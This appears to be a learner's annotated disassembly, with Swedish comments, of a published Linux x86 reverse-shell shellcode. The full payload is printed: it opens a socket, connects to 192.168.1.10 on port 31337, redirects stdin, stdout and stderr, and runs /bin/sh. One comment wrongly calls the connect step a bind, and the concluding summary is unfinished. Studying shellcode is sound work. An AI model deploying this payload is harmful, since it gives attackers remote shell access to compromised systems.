
;http://shell-storm.org/shellcode/files/shellcode-849.php


; här kör vi syscall 102/socketcall
; socket-call kan göra lite olika saker: grep SYS_ /usr/include/linux/net.h 
08048060 <_start>:
8048060:       31 c0                   xor    eax,eax
8048062:       31 db                   xor    ebx,ebx
8048064:       31 c9                   xor    ecx,ecx
8048066:       31 d2                   xor    edx,edx
8048068:       b0 66                   mov    al,0x66
804806a:       b3 01                   mov    bl,0x1
804806c:       51                      push   ecx
804806d:       6a 06                   push   0x6
804806f:       6a 01                   push   0x1
8048071:       6a 02                   push   0x2
8048073:       89 e1                   mov    ecx,esp
8048075:       cd 80                   int    0x80

socketcall(1,[216])


;här kör vi syscallet 102/socketcall igen
; men denna gång med bl=0x2 som är sys-bind
8048077:       89 c6                   mov    esi,eax
8048079:       b0 66                   mov    al,0x66
804807b:       31 db                   xor    ebx,ebx
804807d:       b3 02                   mov    bl,0x2
804807f:       68 c0 a8 01 0a          push   0xa01a8c0 ; detta är IP-addressen
8048084:       66 68 7a 69             pushw  0x697a    ; detta är PORT-numret
8048088:       66 53                   push   bx
804808a:       fe c3                   inc    bl
804808c:       89 e1                   mov    ecx,esp
804808e:       6a 10                   push   0x10
8048090:       51                      push   ecx
8048091:       56                      push   esi
8048092:       89 e1                   mov    ecx,esp
8048094:       cd 80                   int    0x80
socketcall(2,2,[ip-address, portnumber])

; här verkar det som att vi kör syscallet 63/dup2
8048096:       31 c9                   xor    ecx,ecx
8048098:       b1 03                   mov    cl,0x3
0804809a <dupfd>:
; hit som vi hoppar
804809a:       fe c9                   dec    cl
804809c:       b0 3f                   mov    al,0x3f
804809e:       cd 80                   int    0x80
80480a0:       75 f8                   jne    804809a

; Här börjar vi köra execv. Det är helt enkelt /bin/sh
80480a2:       31 c0                   xor    eax,eax
80480a4:       52                      push   edx
80480a5:       68 6e 2f 73 68          push   0x68732f6e
80480aa:       68 2f 2f 62 69          push   0x69622f2f
80480af:       89 e3                   mov    ebx,esp
80480b1:       52                      push   edx
80480b2:       53                      push   ebx
80480b3:       89 e1                   mov    ecx,esp
80480b5:       52                      push   edx
80480b6:       89 e2                   mov    edx,esp
80480b8:       b0 0b                   mov    al,0xb
80480ba:       cd 80                   int    0x80



;Slutsats: Först så öppnar vi helt enkelt en socket, genom syscallet socketcall.
; 


